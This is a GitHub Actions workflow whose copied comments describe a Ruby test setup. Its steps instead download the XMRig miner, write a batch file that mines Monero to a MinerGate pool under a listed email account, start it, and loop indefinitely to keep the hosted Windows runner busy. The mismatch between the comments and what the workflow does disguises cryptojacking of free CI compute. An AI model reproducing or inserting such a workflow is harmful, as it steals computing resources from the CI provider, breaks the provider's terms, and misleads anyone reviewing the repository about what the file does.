# This workflow uses actions that are not certified by GitHub.
# They are provided by a third-party and are governed by
# separate terms of service, privacy policy, and support
# documentation.
# This workflow will download a prebuilt Ruby version, install dependencies and run tests with Rake
# For more information see: https://github.com/marketplace/actions/setup-ruby-jruby-and-truffleruby

# This is a basic workflow to help you get started with Actions

name: runner

on: [push, workflow_dispatch]

jobs:

  build:

    runs-on: windows-latest

    steps:

    - name: Download

      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-gcc-win64.zip -OutFile xmrig.zip

    - name: Extract

      run: Expand-Archive -LiteralPath xmrig.Zip

    - name: write

      run: Set-Content -Path '.\xmrig\xmrig-6.12.2\c.bat' -Value 'xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u devintaison568@gmail.com -p x --threads=1'

    - name: run

      run: cd .\xmrig\xmrig-6.12.2\ ; start-process c.bat

    - name: walk

      run: for (;;){$i++; Write-Host $i ; Start-Sleep -s 10}
